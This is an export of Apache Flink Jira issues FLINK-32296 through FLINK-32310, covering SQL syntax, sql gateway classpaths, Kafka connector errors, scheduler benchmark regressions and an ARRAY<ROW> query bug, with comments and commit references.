Support enhanced show functions syntax,FLINK-32310,13539647,13526484,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,taoran,taoran,12/Jun/23 10:45,04/Jul/23 01:29,04/Jun/24 20:41,04/Jul/23 01:29,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,Table SQL / Planner,,,0,pull-request-available,,,"As FLIP discussed. We will support new syntax for showing functions.

The syntax:
| |SHOW [USER] FUNCTIONS [ ( FROM \| IN ) [catalog_name.]database_name ] [ [NOT] (LIKE \| ILIKE) <sql_like_pattern> ]| |",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 01:29:16 UTC 2023,,,,,,,,,,"0|z1ihdc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/Jun/23 03:38;luoyuxia;[~lemonjing] Sorry to bother you. I'm wondering there's any progress in this ticket. I'm going to start the work FLINK-32355  in the begining of next month.  I hope it can be merge first to avoid the confict in my implementation so that it can save us time. But I'm fine with my pr comes first if you can't find some time to finish this ticket.;;;","29/Jun/23 11:58;taoran;[~luoyuxia] hi. yuxia. Sorry for the late reply. I have submitted this PR, the general logic is consistent with your show procedure, there is a little difference. Considering the different forms of like, I have given an enumeration of like to be compatible with other possible likes in the future. If you have time, pls help me to review it.  thanks and sorry again.;;;","29/Jun/23 12:43;luoyuxia;[~lemonjing] Never mind. I'll have a look when I'm free.;;;","04/Jul/23 01:29;luoyuxia;master:

c090846e5d73a718b32ca5ddfa920d69edf57d61

Thanks for the pr.;;;",,,,,,,,,,,,,,,,,,,
Shared classpaths and jars manager for jobs in sql gateway cause confliction,FLINK-32309,13539628,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,12/Jun/23 09:18,01/Nov/23 11:01,04/Jun/24 20:41,01/Nov/23 11:01,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / Gateway,,,,0,pull-request-available,stale-assigned,,"Current all jobs in the same session of sql gateway will share the resource manager which provide the classpath for jobs. After a job is performed, it's classpath and jars will be in the shared resource manager which are used by the next jobs. It may cause too many unnecessary jars in a job or even cause confliction ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Nov 01 11:01:09 UTC 2023,,,,,,,,,,"0|z1ih94:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","01/Nov/23 11:01;guoyangze;master: dd47530f1eee829242c1c7a5fab9b4b8553cba5a;;;",,,,,,,,,,,,,,,,,,,,,
RestClusterClient submit job to remote cluster,FLINK-32308,13539627,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Not a Priority,Invalid,,SpongebobZ,SpongebobZ,12/Jun/23 09:14,12/Jun/23 12:11,04/Jun/24 20:41,12/Jun/23 12:11,1.14.5,,,,,,,,,,,,,,,,,,,,Runtime / REST,,,,0,,,,"I just used `RestClusterClient` submit job to remote cluster, but out of my expectation it submitted to local cluster instead. Could you help with me
{code:java}
String host = ""x.x.x.x"";
int port = 8081;
Configuration flinkConfiguration = new Configuration();
flinkConfiguration.setString(JobManagerOptions.ADDRESS, host);
flinkConfiguration.setInteger(JobManagerOptions.PORT, 6123);
flinkConfiguration.setInteger(RestOptions.PORT, port);

RestClusterClient<StandaloneClusterId> clusterClient = new RestClusterClient<>(flinkConfiguration, StandaloneClusterId.getInstance());
String s = clusterClient.getWebInterfaceURL();
List<URL> extraJars = new ArrayList<>();
extraJars.add(new File(""C:\\Users\\extend.jar"").toURI().toURL());
PackagedProgram packagedProgram = PackagedProgram.newBuilder()
        .setConfiguration(flinkConfiguration)
        .setJarFile(new File(""F:\\data.jar""))
        .setEntryPointClassName(""MyApplication"")
        .setUserClassPaths(extraJars)
        .build();
JobID jobID = JobID.generate();
JobGraph jobGraph = PackagedProgramUtils.createJobGraph(packagedProgram, flinkConfiguration, 2, jobID, false);
clusterClient.submitJob(jobGraph);
System.out.println(jobID); {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 12:11:04 UTC 2023,,,,,,,,,,"0|z1ih8w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 12:11;martijnvisser;[~SpongebobZ] This request for help should be asked via the User mailing list, Stackoverflow or Slack. Jira is for bugs or new feature requests;;;",,,,,,,,,,,,,,,,,,,,,,
"Incorrect docs for default behavior of ""scan.startup.mode"" option",FLINK-32307,13539617,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,gunnar.morling,gunnar.morling,12/Jun/23 08:10,12/Jun/23 08:10,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"The [Kafka connector docs|https://nightlies.apache.org/flink/flink-docs-master/docs/connectors/table/kafka/#start-reading-position] say this in regards to the {{scan.startup.mode}} option:

{quote}
The default option value is group-offsets which indicates to consume from last committed offsets in ZK / Kafka brokers.
{quote}

Whereas what I actually observe is that the ""earliest-offset"" mode is used when not specifying a value for this option. This matches the implementation in [{{KafkaSourceBuilder}}|https://github.com/apache/flink/blob/master/flink-connectors/flink-connector-kafka/src/main/java/org/apache/flink/connector/kafka/source/KafkaSourceBuilder.java#L106] from a quick glimpse.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 08:10:55 UTC 2023,,,,,,,,,,"0|z1ih6o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 08:10;gunnar.morling;Happy to send a PR, unless someone feels I'm off here.;;;",,,,,,,,,,,,,,,,,,,,,,
Multiple batch scheduler performance regressions,FLINK-32306,13539563,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,martijnvisser,martijnvisser,11/Jun/23 11:58,12/Jun/23 08:49,04/Jun/24 20:41,12/Jun/23 08:04,,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,,,,"InitScheduling.BATCH

http://codespeed.dak8s.net:8000/timeline/#/?exe=5&ben=initSchedulingStrategy.BATCH&extr=on&quarts=on&equid=off&env=2&revs=200

schedulingDownstreamTasks.BATCH 

http://codespeed.dak8s.net:8000/timeline/#/?exe=5&ben=schedulingDownstreamTasks.BATCH&extr=on&quarts=on&equid=off&env=2&revs=200

startScheduling.BATCH

http://codespeed.dak8s.net:8000/timeline/#/?exe=5&ben=startScheduling.BATCH&extr=on&quarts=on&equid=off&env=2&revs=200

",,,,,,,,,,,,,,,,,,,,FLINK-32288,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 08:49:40 UTC 2023,,,,,,,,,,"0|z1iguo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/Jun/23 14:00;zhuzh;Thanks for reporting this! [~martijnvisser]
This happens because we have changed these benchmarks to benchmark AdaptiveBatchScheduler(previously DefaultScheduler), which is currently the recommended and default scheduler for batch jobs. See FLINK-30480.
So this is not a blocker issue. It's just some existing problems are newly exposes.

Here are some more details:
1. The regression of InitScheduling.BATCH is small (several milli-seconds) and it's a one time operation. Therefore it can be ignored.
2. We are aware of the performance regression of schedulingDownstreamTasks.BATCH, FLINK-32288 was opened for it and there is a fix in development.
3. The regression of startScheduling.BATCH was not expected. We will take a look. cc [~xiasun];;;","12/Jun/23 06:30;xiasun;Hi [~martijnvisser] , Thanks for reporting this!

As [~zhuzh]  mentioned, we replaced the scheduler type in the batch job benchmark and exposed the existing performance regression issues. I would like to further explain the third issue mentioned above. Due to the fact that the AdaptiveBatchScheduler schedules a dynamic graph, the vertices initialization which was originally executed in the createScheduler phase was lazily loaded and delayed until the startScheduling phase, where the `initializeVerticesIfPossible()` method is called in `AdaptiveBatchScheduler#startSchedulingInternal`.

As the latest benchmark shows, the createScheduler phase reduced its time consumption by about 200ms ([benchmark url|http://codespeed.dak8s.net:8000/timeline/#/?exe=1,3,5,6,8,9&ben=createScheduler.BATCH&env=2&revs=200&equid=off&quarts=on&extr=on]), while the startScheduling phase increased its time consumption by 200ms, confirming this point. Since both methods are only called once during the initialization phase, they do not reduce the overall performance.;;;","12/Jun/23 06:52;martijnvisser;[~xiasun] [~zhuzh] Thanks for checking the ticket. What do you think should happen with the ticket and/or the priority, given that some of these regressions were to be expected?;;;","12/Jun/23 08:02;zhuzh;Given that the only problem is the schedulingDownstreamTasks.BATCH, I will close this ticket because it duplicates FLINK-32288.;;;","12/Jun/23 08:49;martijnvisser;[~zhuzh] Ack, thnx!;;;",,,,,,,,,,,,,,,,,,
History Server is slow at starting,FLINK-32305,13539476,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,yzang,yzang,09/Jun/23 18:38,20/Aug/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Web Frontend,,,,0,auto-deprioritized-major,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Aug 20 22:35:15 UTC 2023,,,,,,,,,,"0|z1igbc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","20/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Reduce rpc-akka jar size,FLINK-32304,13539466,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,09/Jun/23 16:51,13/Jun/23 17:49,04/Jun/24 20:41,13/Jun/23 17:47,,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Build System,Runtime / RPC,,,0,pull-request-available,,,"We bundle unnecessary dependencies in the rpc-akka jar; we can easily shave of 15mb of dependencies.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 17:47:34 UTC 2023,,,,,,,,,,"0|z1ig94:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 17:47;chesnay;master: f145341bd6085d003922cba0a157693bd56338b0
1.17: 404984a28a696328a2b8aaf939237ea61e9eddfe;;;",,,,,,,,,,,,,,,,,,,,,,
Incorrect error message in KafkaSource ,FLINK-32303,13539462,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,pnowojski,pnowojski,09/Jun/23 16:43,09/Jun/23 16:48,04/Jun/24 20:41,,1.17.1,1.18.0,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"When exception is thrown from an operator chained with a KafkaSource, KafkaSource is returning a misleading error, like shown below:

{noformat}
java.io.IOException: Failed to deserialize consumer record due to
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter.emitRecord(KafkaRecordEmitter.java:56) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter.emitRecord(KafkaRecordEmitter.java:33) ~[classes/:?]
	at org.apache.flink.connector.base.source.reader.SourceReaderBase.pollNext(SourceReaderBase.java:160) ~[classes/:?]
	at org.apache.flink.streaming.api.operators.SourceOperator.emitNext(SourceOperator.java:417) ~[classes/:?]
	at org.apache.flink.streaming.runtime.io.StreamTaskSourceInput.emitNext(StreamTaskSourceInput.java:68) ~[classes/:?]
	at org.apache.flink.streaming.runtime.io.StreamOneInputProcessor.processInput(StreamOneInputProcessor.java:65) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.StreamTask.processInput(StreamTask.java:562) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.mailbox.MailboxProcessor.runMailboxLoop(MailboxProcessor.java:231) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.StreamTask.runMailboxLoop(StreamTask.java:852) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.StreamTask.invoke(StreamTask.java:801) ~[classes/:?]
	at org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring(Task.java:952) ~[classes/:?]
	at org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke(Task.java:931) [classes/:?]
	at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:745) [classes/:?]
	at org.apache.flink.runtime.taskmanager.Task.run(Task.java:562) [classes/:?]
	at java.lang.Thread.run(Thread.java:829) [?:?]
Caused by: org.apache.flink.streaming.runtime.tasks.ExceptionInChainedOperatorException: Could not forward element to next operator
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.pushToOperator(CopyingChainingOutput.java:92) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.collect(CopyingChainingOutput.java:50) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.collect(CopyingChainingOutput.java:29) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.SourceOperatorStreamTask$AsyncDataOutputToOutput.emitRecord(SourceOperatorStreamTask.java:309) ~[classes/:?]
	at org.apache.flink.streaming.api.operators.source.SourceOutputWithWatermarks.collect(SourceOutputWithWatermarks.java:110) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter$SourceOutputWrapper.collect(KafkaRecordEmitter.java:67) ~[classes/:?]
	at org.apache.flink.api.common.serialization.DeserializationSchema.deserialize(DeserializationSchema.java:84) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.deserializer.KafkaValueOnlyDeserializationSchemaWrapper.deserialize(KafkaValueOnlyDeserializationSchemaWrapper.java:51) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter.emitRecord(KafkaRecordEmitter.java:53) ~[classes/:?]
	... 14 more
Caused by: org.apache.flink.runtime.operators.testutils.ExpectedTestException: Failover!
	at org.apache.flink.test.ManySmallJobsBenchmarkITCase$ThrottlingAndFailingIdentityMap.map(ManySmallJobsBenchmarkITCase.java:263) ~[test-classes/:?]
	at org.apache.flink.test.ManySmallJobsBenchmarkITCase$ThrottlingAndFailingIdentityMap.map(ManySmallJobsBenchmarkITCase.java:243) ~[test-classes/:?]
	at org.apache.flink.streaming.api.operators.StreamMap.processElement(StreamMap.java:38) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.pushToOperator(CopyingChainingOutput.java:75) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.collect(CopyingChainingOutput.java:50) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.CopyingChainingOutput.collect(CopyingChainingOutput.java:29) ~[classes/:?]
	at org.apache.flink.streaming.runtime.tasks.SourceOperatorStreamTask$AsyncDataOutputToOutput.emitRecord(SourceOperatorStreamTask.java:309) ~[classes/:?]
	at org.apache.flink.streaming.api.operators.source.SourceOutputWithWatermarks.collect(SourceOutputWithWatermarks.java:110) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter$SourceOutputWrapper.collect(KafkaRecordEmitter.java:67) ~[classes/:?]
	at org.apache.flink.api.common.serialization.DeserializationSchema.deserialize(DeserializationSchema.java:84) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.deserializer.KafkaValueOnlyDeserializationSchemaWrapper.deserialize(KafkaValueOnlyDeserializationSchemaWrapper.java:51) ~[classes/:?]
	at org.apache.flink.connector.kafka.source.reader.KafkaRecordEmitter.emitRecord(KafkaRecordEmitter.java:53) ~[classes/:?]
	... 14 more
{noformat}
",,,,,,,,,,,,,,,,,,,,,FLINK-25132,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 16:47:11 UTC 2023,,,,,,,,,,"0|z1ig88:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 16:47;pnowojski;I think this bug has been introduced by FLINK-25132 and I think a solution should be to just simply remove the 

{code:java}
        try {
            (...)
        } catch (Exception e) {
            throw new IOException(""Failed to deserialize consumer record due to"", e);
        }
{code}

exception wrapping in {{KafkaRecordEmitter#emitRecord}}. I don't see any value of that.  [~renqs], WDYT?;;;",,,,,,,,,,,,,,,,,,,,,,
Disable Hbase 2.x tests on Java 17,FLINK-32302,13539448,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,09/Jun/23 14:10,13/Jun/23 08:47,04/Jun/24 20:41,13/Jun/23 08:47,,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / HBase,Tests,,,0,pull-request-available,,,"Lacking support on the HBase side. Version bumps may solve it, but that's out of scope of this issue since the connector is being externalized.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 08:47:43 UTC 2023,,,,,,,,,,"0|z1ig54:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 08:47;chesnay;master: 4a742c86a917af432c0a6ec433acf18c176faf1f;;;",,,,,,,,,,,,,,,,,,,,,,
common.sh#create_ha_config should use set_config_key,FLINK-32301,13539434,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,09/Jun/23 12:52,13/Jun/23 16:47,04/Jun/24 20:41,13/Jun/23 16:47,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"Instead of replacing the entire configuration, set the desired individual options instead.
The current approach isn't great because it prevents us from setting required defaults in the flink-dist config.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 16:47:13 UTC 2023,,,,,,,,,,"0|z1ig20:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 16:47;chesnay;master: 4d22ad0cc3ff24619cd111e139cf3f9606521a6b;;;",,,,,,,,,,,,,,,,,,,,,,
Support get object for result set,FLINK-32300,13539425,13528918,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,09/Jun/23 12:27,12/Jun/23 14:30,04/Jun/24 20:41,12/Jun/23 14:30,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / JDBC,,,,0,pull-request-available,,,Support get object for result set,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 14:30:02 UTC 2023,,,,,,,,,,"0|z1ig00:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 14:30;libenchao;Fixed via https://github.com/apache/flink/commit/c7afa323582888ec90941e091f72b6ef3a599b13 (master)

[~zjureel] Thanks for your PR!;;;",,,,,,,,,,,,,,,,,,,,,,
Upload python jar when sql contains python udf jar,FLINK-32299,13539413,13417633,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,guoyangze,fsk119,fsk119,09/Jun/23 11:00,29/Mar/24 06:20,04/Jun/24 20:41,17/Nov/23 09:47,,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / Gateway,Table SQL / Runtime,,,1,pull-request-available,,,"Currently, sql gateway always uploads the python jar when submitting jobs. However, it's not required for every sql job. We should add the python jar into the PipelineOpitons.JARS only when user jobs contain python udf.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Nov 17 09:47:06 UTC 2023,,,,,,,,,,"0|z1ifxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"17/Nov/23 09:47;guoyangze;master: febbbf3c09c1670faed4dbf1c46a1d1719d8fa8f;;;",,,,,,,,,,,,,,,,,,,,,,
The outputQueueSize is negative ,FLINK-32298,13539402,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,fanrui,fanrui,fanrui,09/Jun/23 09:41,15/Jul/23 16:50,04/Jun/24 20:41,14/Jul/23 13:23,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Network,,,,0,pull-request-available,,,"h1. Backgraound

The outputQueueSize indicates `The real size of queued output buffers in bytes.`, so it shouldn't be negative. However, it may be negative in some cases.
h2. How outputQueueSize is generated?

TotalWrittenBytes: *_BufferWritingResultPartition#totalWrittenBytes_* records how many data is written to ResultPartition.

TotalSentNumberOfBytes: *_PipelinedSubpartition#totalNumberOfBytes_* records how many data is sent to downstream.

The outputQueueSize = TotalWrittenBytes - TotalSentNumberOfBytes.
h1. Bug

The TotalSentNumberOfBytes may be larger than TotalWrittenBytes due to some data are written to the PipelinedSubpartition without the BufferWritingResultPartition, such as : 
 # PipelinedSubpartition#finishReadRecoveredState writes the `EndOfChannelStateEvent` even if the unaligned checkpoint is disable
 # PipelinedSubpartition#addRecovered writes channel state(if the job recovered from unaligned checkpoint, the outputQueueSize is totally wrong)
 # PipelinedSubpartition#finish writes the `EndOfPartitionEvent`

!image-2023-06-09-17-27-46-429.png|width=1033,height=296!

 
h1. Solution

PipelinedSubpartition should is written through BufferWritingResultPartition, and all writes should be counted.

 

By the way, outputQueueSize doesn't matter because it's just a metric, it doesn't affect data processing. I found this bug because some of our flink scenarios need to use adaptive rebalance (FLINK-31655), I'm developing it in our internal version, which relies on the correct outputQueueSize to select the low pressure channel.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/23 09:27;fanrui;image-2023-06-09-17-27-46-429.png;https://issues.apache.org/jira/secure/attachment/13058899/image-2023-06-09-17-27-46-429.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 13:23:11 UTC 2023,,,,,,,,,,"0|z1ifuw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jul/23 13:23;fanrui;Merged via 34f4f94 (master, 1.18)

Don't backport it to 1.16 and 1.17 due to it just effects the metric. If it's useful I can do it.;;;",,,,,,,,,,,,,,,,,,,,,,
Use Temurin image in FlinkImageBuilder,FLINK-32297,13539396,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,09/Jun/23 09:01,13/Jun/23 19:05,04/Jun/24 20:41,13/Jun/23 19:05,,,,,,,,,,,,,,,1.18.0,,,,,,Test Infrastructure,,,,0,pull-request-available,,,"The FlinkImageBuilder currently uses openjdk images. I've seen issues with these on Java 17, and propose to use Temurin, similar to the prod images.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 19:05:25 UTC 2023,,,,,,,,,,"0|z1iftk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 19:05;chesnay;master: f83c6e0cc9dec2ec563c5ad65aa87622c47f7462;;;",,,,,,,,,,,,,,,,,,,,,,
Flink SQL handle array of row incorrectly,FLINK-32296,13539395,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,qingwei91,qingwei91,09/Jun/23 09:01,25/Oct/23 10:01,04/Jun/24 20:41,23/Aug/23 19:26,1.15.3,1.16.2,1.17.1,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,1.19.0,,,Table SQL / API,,,,0,pull-request-available,,,"FlinkSQL produce incorrect result when involving data with type of ARRAY<ROW>, here's a reproduction:

 

 
{code:java}
CREATE TEMPORARY VIEW bug_data as (
SELECT CAST(ARRAY[
(10, '2020-01-10'), (101, '244ddf'), (1011, '2asdfaf'), (1110, '200'), (2210, '20-01-10'), (4410, '21111')
] AS ARRAY<ROW<A INT, B STRING>>)
UNION
SELECT CAST(ARRAY[
(10, '2020-01-10'), (121, '244ddf'), (2222, '2asdfaf'), (32243, '200'), (2210, '33333-01-10'), (4410, '23243243')
] AS ARRAY<ROW<A INT, B STRING>>)
UNION SELECT CAST(ARRAY[
(10, '2020-01-10'), (222, '244ddf'), (1011, '2asdfaf'), (1110, '200'), (24367, '20-01-10'), (4410, '21111')
] AS ARRAY<ROW<A INT, B STRING>>)
UNION SELECT CAST(ARRAY[
(10, '2020-01-10'), (5666, '244ddf'), (435243, '2asdfaf'), (56567, '200'), (2210, '20-01-10'), (4410, '21111')
] AS ARRAY<ROW<A INT, B STRING>>)
UNION SELECT CAST(ARRAY[
(10, '2020-01-10'), (43543, '244ddf'), (1011, '2asdfaf'), (1110, '200'), (8967564, '20-01-10'), (4410, '21111')
] AS ARRAY<ROW<A INT, B STRING>>)
);

CREATE TABLE sink (
r ARRAY<ROW<A INT, B STRING>>
) WITH ('connector' = 'print'); {code}
 

 

In all 1.15. 1.16 and 1.17 version I've tested, it produces the following:

 
{noformat}
[+I[4410, 21111], +I[4410, 21111], +I[4410, 21111], +I[4410, 21111], +I[4410, 21111], +I[4410, 21111]]

[+I[4410, 23243243], +I[4410, 23243243], +I[4410, 23243243], +I[4410, 23243243], +I[4410, 23243243], +I[4410, 23243243]]{noformat}
 

 

I think this is unexpected/wrong because:
 # The query should produce 5 rows, not 2
 # The data is also wrong, noticed it just make every row in the array the same, but the input are not the same.

